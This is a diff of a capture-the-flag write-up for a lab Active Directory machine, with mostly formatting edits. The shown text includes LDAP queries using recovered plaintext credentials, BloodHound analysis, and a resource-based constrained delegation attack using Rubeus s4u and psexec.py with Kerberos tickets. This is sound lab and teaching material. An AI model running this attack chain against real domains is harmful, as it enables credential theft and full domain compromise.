@@ -27,6 +27,7 @@ Host script results:
 |   date: 2022-12-18T15:17:04
 |_  start_date: N/A
 ```
+Looks like a domain controller cause of port 88 kerberos and dns on 53.
 ## SMB
 Works with null auth.
 ```bash
@@ -71,14 +72,17 @@ support\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 ```bash
 ldapsearch -D ldap@support -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -H ldap://10.10.11.174 -s sub -b 'DC=support,DC=htb' > ldap.dump
 ```
-find unique values for potential passwords.
-found an info field
+Find unique values for potential passwords.
+
+Found an info field.
 ```bash
 cat ldap.dump | awk -F: '{print $1}' | sort | uniq -c | sort | grep -v '#'
 ```
 This contains a password for the support user
-support:Ironside47pleasure40Watchful
+```
 
+support:Ironside47pleasure40Watchful
+```
 # Bloodhound
 ## Injester
 ```bash
@@ -92,6 +96,7 @@ Support user can PSremote. Also has genericall over the domain controller, which
 
 # Foothold
 evil-winrm
+
 and user flag :)
 # Priv esc
 Using the genericall abuse info on bloodhound you can create a machine account which can be used to impersonate a domain admin.
@@ -114,7 +119,7 @@ Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impe
 ## The better way
 So I have done this attack before without using powerview, instead using the adsi module which is built into powershell. This avoids downloading and running powerview on the machine.
 
-The 4 steps.
+4 steps.
 1. Make new computer account
 2. Get the SID of the account
 3. Add the `allowedtoactonbehalfofotheridentity` attribute to the target. 
@@ -179,22 +184,24 @@ Does that.
 $CompSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]'alfheim$')
 $CompSearcher.filter = "(samAccountType=805306369)"
 ```
-*Does this work?*
+*Does this work?* nope
 
-nope
 (40 min of being completly confused later)
-swpa out the name for ldap path. Cause thats what sorta happens in step 2.
+
+Swap out the name for ldap path. Cause thats what sorta happens in step 2.
 It works? (which means something else will be broken)
 ```powershell
 $CompSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]'LDAP://CN=alfheim,CN=Computers,DC=support,DC=htb')
 $CompSearcher.filter = "(samAccountType=805306369)"
 ```
 And back to the start.
+
 I have completly no idea.
 
 ## Bloodhound's way
 Copy paste bloodhound's method but change the name :)
-wow look it works.
+
+wow look it works. (magic)
 
 Convert the ticket to ccache format
 ```
@@ -205,4 +212,4 @@ Auth with ticket
 ```
 KRB5CCNAME=out psexec.py -k -no-pass support.htb/administrator@dc.support.htb
 ```
-:)
+root flag :)
